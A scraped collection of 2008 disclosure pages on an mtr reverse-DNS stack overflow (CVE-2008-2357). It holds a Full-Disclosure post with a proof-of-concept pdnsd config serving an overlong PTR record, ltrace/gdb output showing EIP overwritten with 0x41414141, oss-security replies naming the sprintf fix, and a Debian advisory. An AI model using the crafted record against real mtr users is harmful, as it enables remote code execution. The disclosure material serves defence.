        randomize_servers = on; # Give every root server an equal chance
                                # of being queried.
        ip =    198.41.0.4
        ,       192.228.79.201
        ,       192.33.4.12
        ,       128.8.10.90
        ,       192.203.230.10
        ,       192.5.5.241
        ,       192.112.36.4
        ,       128.63.2.53
        ,       192.36.148.17
        ,       192.58.128.30
        ,       193.0.14.129
        ,       198.32.64.12
        ,       202.12.27.33
        ;
        timeout = 5;
        uptest = query;         # Test availability using empty DNS queries.
        interval = 30m;         # Test every half hour.
        ping_timeout = 300;     # Test should time out after 30 seconds.
        purge_cache = off;
        exclude = .localdomain;
        policy = included;
        preset = off;
}
*/

source {
        owner=localhost;
#       serve_aliases=on;
        file="/etc/hosts";
}

rr {
        name=localhost;
        reverse=on;
        a=127.0.0.1;
        owner=localhost;
        soa=localhost,root.localhost,42,86400,900,86400,86400;
}

rr {

name=AAAAAAAA.AAAAAAAAA.AAAAAAAA.AAAAAAAAAAAAAA.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.AAAAAAAAAAAAAAAAAAAAAAAAAA.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.cos.pl;
        reverse=on;
        a=12.34.56.78;
        owner=localhost;
        soa=localhost,root.localhost,42,86400,900,86400,86400;
}

/*
neg {
        name=doubleclick.net;
        types=domain;   # This will also block xxx.doubleclick.net, etc.
}
*/

/*
neg {
        name=bad.server.com;   # Badly behaved server you don't want to connect to.
        types=A,AAAA;
}
*/
--- CUT ---

Ok Let's look how it works:

[1] => First screen
[2] => Second terminal

[1]:
[root@lost-coder pdnsd-1.2.6]# ./src/pdnsd -c ./doc/pdnsd.conf
[*] len = 4
[*] len = 4
* 03/15 01:56:04| pdnsd: info: pdnsd-1.2.6-par starting.

[2]:
[root@lost-coder mtr-0.72]# ltrace ./mtr -p 12.34.56.78
...
...
...
recvfrom(5, 0xbfffe970, 4470, 0, 0xbfffe8f0)                                   = 64
recvfrom(7, 0x81db720, 512, 0, 0x81dbd60)                                      = 285
__res_state(0x81dbd64, 0x81e4200, 2, 0, 0x81dbd60)                             = 0x40189cc0
__res_state(0x40189cd4, 0x81dbd64, 2, 0, 0x81dbd60)                            = 0x40189cc0
sprintf("78.56.34.12.in-addr.arpa", "%u.%u.%u.%u.in-addr.arpa", 78, 56, 34, 12) = 24
__dn_expand(0x81db720, 0x81db83d, 0x81db72c, 0x81e4220, 1025)                  = 26
strlen("78.56.34.12.in-addr.arpa")                                             = 24
strcasecmp("78.56.34.12.in-addr.arpa", "78.56.34.12.in-addr.arpa")             = 0
__dn_expand(0x81db720, 0x81db83d, 0x81db74a, 0x81e4220, 1025)                  = 2
strlen("78.56.34.12.in-addr.arpa")                                             = 24
strcasecmp("78.56.34.12.in-addr.arpa", "78.56.34.12.in-addr.arpa")             = 0
__dn_expand(0x81db720, 0x81db83d, 0x81db756, 0x81e4220, 1025)                  = 192
strlen("\\[x4141414141414109].\\[x41414141"...)                                = 300
malloc(305)                                                                    = 0x8200740
strcpy(0x8200744, "\\[x4141414141414109].\\[x41414141"...)                     = 0x8200744
__dn_expand(0x81db720, 0x81db83d, 0x81db816, 0x81e4220, 1025)                  = 2
strlen("78.56.34.12.in-addr.arpa")                                             = 24
strcasecmp("78.56.34.12.in-addr.arpa", "78.56.34.12.in-addr.arpa")             = 0
__dn_expand(0x81db720, 0x81db83d, 0x81db82d, 0x81e4220, 1025)                  = 2
strlen("78.56.34.12.in-addr.arpa")                                             = 24
strcasecmp("78.56.34.12.in-addr.arpa", "localhost")                            = -53
select(8, 0xbffffb70, 0, 0, 0xbffffb60)                                        = 1
gettimeofday(0xbfffe8e8, NULL)                                                 = 0
recvfrom(5, 0xbfffe970, 4470, 0, 0xbfffe8f0)                                   = 64
getpid()                                                                       = 5905
select(8, 0xbffffb70, 0, 0, 0xbffffb60)                                        = 0
sprintf("\\[x4141414141414109].\\[x41414141"..., "%s %d %d %d %d %d %d", "\\[x4141414141414109].\\[x41414141"..., 0,
1, 1,
50, 50, 50) = 315
strcmp("\\[x4141414141414109].\\[x41414141"..., "12.34.56.78 0 1 1 50 50 50")  = 1
printf("%d %s\n", 1, "\\[x4141414141414109].\\[x41414141"...1
\[x4141414141414109].\[x4141414141414108].\[x4141414141410e41].\[x4141414141414141].\[x4138414141414141].\[x4141414141414141]
.\[x4141414141414141].\[x4141414141414141].\[x4141414141414141].\[x4141414141414141].AAAAAAAAAAAAAAAAAAAAAAAAAA.AAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.cos.pl
0 1 1 50 50 50
)                  = 318
fflush(0x40187860)                                                             = 0
strcpy(0x81f0660, "\\[x4141414141414109].\\[x41414141"...)                     = 0x81f0660
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
[root@lost-coder mtr-0.72]# gdb -q ./mtr core
Using host libthread_db library "/lib/libthread_db.so.1".
Reading symbols from /lib/libresolv.so.2...done.
Loaded symbols for /lib/libresolv.so.2
Reading symbols from /lib/libm.so.6...done.
Loaded symbols for /lib/libm.so.6
Reading symbols from /lib/libncurses.so.5...done.
Loaded symbols for /lib/libncurses.so.5
Reading symbols from /lib/libc.so.6...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/libtinfo.so.5...done.
Loaded symbols for /lib/libtinfo.so.5
Reading symbols from /lib/ld-linux.so.2...done.
Loaded symbols for /lib/ld-linux.so.2
Reading symbols from /lib/libdl.so.2...done.
Loaded symbols for /lib/libdl.so.2
Core was generated by `./mtr -p 12.34.56.78'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) bt
#0  0x41414141 in ?? ()
#1  0x41414141 in ?? ()
#2  0x6f632e41 in ?? ()
#3  0x6c702e73 in ?? ()
#4  0x31203020 in ?? ()
#5  0x35203120 in ?? ()
#6  0x30352030 in ?? ()
#7  0x00303520 in ?? ()
#8  0x40016508 in ?? ()
#9  0x08048b5b in ?? ()
#10 0xbffffc44 in ?? ()
#11 0xbffffb58 in ?? ()
#12 0x00000000 in ?? ()
(gdb) i r
eax            0x81f0660        136250976
ecx            0x481f0c6f       1209994351
edx            0xbffffb2c       -1073743060
ebx            0x41414141       1094795585
esp            0xbffffb10       0xbffffb10
ebp            0x41414141       0x41414141
esi            0x41414141       1094795585
edi            0x41414141       1094795585
eip            0x41414141       0x41414141
eflags         0x10286  [ PF SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x2b     43
gs             0x2b     43
(gdb) hehe... ale co by nie bylo i tak kocham Ewunie ;]
Undefined command: "hehe".  Try "help".
(gdb)

Ps. When I play at night with creating domain in specific form i be able to
crash mtr without any options. I just run simple command like $mtr <ip>.
Anyway i didn't write this config file and in future i can't do it again.
When i read source for display with ncurses lib. i saw that i must overwrite
buffer which is 1024 bytes lenght. So it is possible but i can't proof that
in this time... or in night i was too sleepy and i saw what i want :)

That's all. I test it on version 0.72 and 0.69. Probably all versions
are vulnerability. Thanks and Best regards Adam Zabrocki (pi3 / pi3ki31ny).

Ps2. For program autors. You wrote in [!!]:

        /* May be we should test name's length */

the answer is:

"Yes you should ;-)"

--
pi3 (pi3ki31ny) - pi3 (at) itsec pl
<http://pi3.hack.pl>
<http://pi3.phrack.pl>
<http://pi3.shellcode.pl>
<http://pi3.itsec.pl>

_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>

```

---

[![Previous](/images/left-icon-16x16.png)](487)
[By Date](date.html#488)
[![Next](/images/right-icon-16x16.png)](489)

[![Previous](/images/left-icon-16x16.png)](481)
[By Thread](index.html#488)
[![Next](/images/right-icon-16x16.png)](489)

### Current thread:

* **Mtr - remote and local stack overflow - uncomment situation in libresolv.** *Adam Zabrocki (May 20)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.openwall.com_53af0253_20250125_104747.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](4) [[<thread-prev]](2) [[thread-next>]](4) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <48338DFF.6070502@freethemallocs.com>
Date: Tue, 20 May 2008 18:50:39 -0800
From: Jonathan Smith <smithj@...ethemallocs.com>
To: oss-security@...ts.openwall.com
Subject: Re: CVE request: mtr

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Robert Buchholz wrote
| Secunia suggests [1] that 0.73 contains a fix. Did you find any
indication
| to that? The advisory mentions 0.72 as vulnerable, but it is also dated
| February 28. The last mtr was released on April 7, but it seems to me all
| changes are unrelated.

The issue was an insecure use of sprintf in split_redraw(). In 0.73,
uptream changed this to use snprintf, thus fixing the issue.

	smithj

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.9 (GNU/Linux)

iEYEARECAAYFAkgzjf4ACgkQCG91qXPaRekhhACeKPMka0sknIpsV4gtS1zojRl6
jKYAoIrwOd4pxgvxetx39dlJ4fhll2Su
=gZQa
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.debian.org_7dec643e_20250125_104745.html ===


---

[[Date Prev](msg00164.html)][[Date Next](msg00166.html)]
[[Thread Prev](msg00164.html)][[Thread Next](msg00166.html)]
[[Date Index](maillist.html#00165)]
[[Thread Index](threads.html#00165)]

# [SECURITY] [DSA 1587-1] New mtr packages fix execution of arbitrary code

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 1587-1] New mtr packages fix execution of arbitrary code
* *From*: Steve Kemp <skx@debian.org>
* *Date*: Mon, 26 May 2008 13:37:48 +0100
* *Message-id*: <[[🔎]](/msgid-search/20080526123748.GA18233%40steve.org.uk) [20080526123748.GA18233@steve.org.uk](msg00165.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

- ------------------------------------------------------------------------
Debian Security Advisory DSA-1587-1                  security@debian.org
<http://www.debian.org/security/>                               Steve Kemp
May 26, 2008                          <http://www.debian.org/security/faq>
- ------------------------------------------------------------------------

Package        : mtr
Vulnerability  : buffer overflow
Problem type   : remote
Debian-specific: no
CVE Id(s)      : CVE-2008-2357

Adam Zabrocki discovered that under certain circumstances mtr, a full
screen ncurses and X11 traceroute tool, could be tricked into executing
arbitrary code via overly long reverse DNS records.

For the stable distribution (etch), this problem has been fixed in version
0.71-2etch1.

For the unstable distribution (sid), this problem has been fixed in
version 0.73-1.

We recommend that you upgrade your mtr package.

Upgrade instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

Debian GNU/Linux 4.0 alias etch
- -------------------------------

Source archives:

  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1.diff.gz>
    Size/MD5 checksum:    49648 1f32f54087c5cab59d13418277c33959
  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1.dsc>
    Size/MD5 checksum:      594 4dae747ffc1de0170d2578b1b09261ed
  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71.orig.tar.gz>
    Size/MD5 checksum:   205442 8c1c9f5db2c599eea3b12bfed8b80618

alpha architecture (DEC Alpha)

  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_alpha.deb>
    Size/MD5 checksum:    42128 48a8e95d395b07e57852b0005e5225ff
  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_alpha.deb>
    Size/MD5 checksum:    57194 bd922b8c1a5891f71abbb4777faf4e63

amd64 architecture (AMD x86_64 (AMD64))

  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_amd64.deb>
    Size/MD5 checksum:    52320 0d2aa3398184633044d21bdd70e23073
  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_amd64.deb>
    Size/MD5 checksum:    37766 7513344c840d47a8dca23e1e51d6a0cc

arm architecture (ARM)

  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_arm.deb>
    Size/MD5 checksum:    49510 a361681ebc93d48e24d7cca0086b6090
  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_arm.deb>
    Size/MD5 checksum:    35560 69a3c71e6471813882c63e8201c34b80

hppa architecture (HP PA RISC)

  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_hppa.deb>
    Size/MD5 checksum:    54772 4c92f110415d9ef79b54fe91624d892c
  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_hppa.deb>
    Size/MD5 checksum:    39920 fff799aabfd4b1fbd313f6512e02f765

i386 architecture (Intel ia32)

  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_i386.deb>
    Size/MD5 checksum:    34832 46c37b88fbaead1b97685aef100bdff3
  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_i386.deb>
    Size/MD5 checksum:    49498 429bf4027e3adc7a6c65739972f3637e

ia64 architecture (Intel ia64)

  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_ia64.deb>
    Size/MD5 checksum:    51828 52fa9d983e98c382259f844869ce2a9c
  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_ia64.deb>
    Size/MD5 checksum:    68066 389cccac0ec00cbd3e1b32b8372f299b

mips architecture (MIPS (Big Endian))

  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_mips.deb>
    Size/MD5 checksum:    56592 a4706a9a26ded557a35179be774cc4c2
  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_mips.deb>
    Size/MD5 checksum:    42158 40220a8cc23ea78e02e63899379d9211

mipsel architecture (MIPS (Little Endian))

  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_mipsel.deb>
    Size/MD5 checksum:    56468 e422aaae12583d2213208ea93bbf789b
  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_mipsel.deb>
    Size/MD5 checksum:    42014 8965536180263c10a21cd19f621c2f67

powerpc architecture (PowerPC)

  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_powerpc.deb>
    Size/MD5 checksum:    39388 40bfc501ea9369f583d17094e5afe106
  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_powerpc.deb>
    Size/MD5 checksum:    53204 084b6accfd9f629b940b3100329e9569

s390 architecture (IBM S/390)

  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_s390.deb>
    Size/MD5 checksum:    38036 f4f59a3761e2bbc202471ad64f4aa479
  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_s390.deb>
    Size/MD5 checksum:    52968 23670acdeae3170a5c9d9041b9785f32

sparc architecture (Sun SPARC/UltraSPARC)

  <http://security.debian.org/pool/updates/main/m/mtr/mtr_0.71-2etch1_sparc.deb>
    Size/MD5 checksum:    49746 ccfde335d99f424062f5594160c7c584
  <http://security.debian.org/pool/updates/main/m/mtr/mtr-tiny_0.71-2etch1_sparc.deb>
    Size/MD5 checksum:    35560 0e8e7a514058ec63dc283d4bb13b67cb

  These files will probably be moved into the stable distribution on
  its next update.

- ---------------------------------------------------------------------------------
For apt-get: deb <http://security.debian.org/> stable/updates main
For dpkg-ftp: ftp://security.debian.org/debian-security dists/stable/updates/main
Mailing list: debian-security-announce@lists.debian.org
Package info: `apt-cache show <pkg>' and <http://packages.debian.org/><pkg>
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)

iD8DBQFIOq7xwM/Gs81MDZ0RAm1TAJ96gxBalQgU/+K71oHkKaFiPshJwwCfeyU8
Aq/daY88/bHqqdHunaSJBao=
=Sf2d
-----END PGP SIGNATURE-----

```

---



=== Content from www.openwall.com_afc5cc42_20250125_104747.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2008/05/20/5) [[next>]](2) [[<thread-prev]](../../../2008/05/20/5) [[thread-next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <200805210423.19123.rbu@gentoo.org>
Date: Wed, 21 May 2008 04:23:16 +0200
From: Robert Buchholz <rbu@...too.org>
To: oss-security@...ts.openwall.com
Subject: Re: CVE request: mtr

On Wednesday, 21. May 2008, Jonathan Smith wrote:
> <http://seclists.org/fulldisclosure/2008/May/0488.html> has all the
> details.
>
> <https://issues.rpath.com/browse/RPL-2558> is the rpath issue.

Secunia suggests [1] that 0.73 contains a fix. Did you find any indication
to that? The advisory mentions 0.72 as vulnerable, but it is also dated
February 28. The last mtr was released on April 7, but it seems to me all
changes are unrelated.

Robert

[1] <http://secunia.com/advisories/30312/>

Download attachment "[signature.asc](1/1) " of type "application/pgp-signature" (828 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from secunia.com_d713e1a9_20250125_104741.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
